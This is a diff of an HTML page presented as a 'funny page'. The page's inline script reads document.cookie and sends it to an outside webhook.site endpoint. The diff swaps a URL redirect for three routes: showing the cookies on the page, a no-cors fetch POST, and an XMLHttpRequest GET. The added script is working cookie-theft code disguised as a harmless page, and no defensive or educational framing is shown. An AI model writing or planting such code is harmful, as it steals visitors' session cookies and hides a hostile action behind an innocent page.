@@ -5,9 +5,26 @@
 </head>
 <body>
     <h1>Welcome to my funny page!</h1>
+    <div id="cookieDisplay"></div>
     <script>
-        // Send cookies directly in the URL path for better visibility
-        location = 'https://webhook.site/e581788c-8d0e-412e-8849-ef5bd96ea4dd/' + document.cookie;
+        // Display cookies on the page itself
+        const cookies = document.cookie;
+        document.getElementById('cookieDisplay').innerText = cookies;
+        
+        // Also try to send them via fetch with no-cors
+        fetch('https://webhook.site/e581788c-8d0e-412e-8849-ef5bd96ea4dd', {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {
+                'Content-Type': 'text/plain',
+            },
+            body: cookies
+        });
+
+        // And try via XMLHttpRequest as backup
+        const xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://webhook.site/e581788c-8d0e-412e-8849-ef5bd96ea4dd?c=' + encodeURIComponent(cookies));
+        xhr.send();
     </script>
 </body>
 </html>
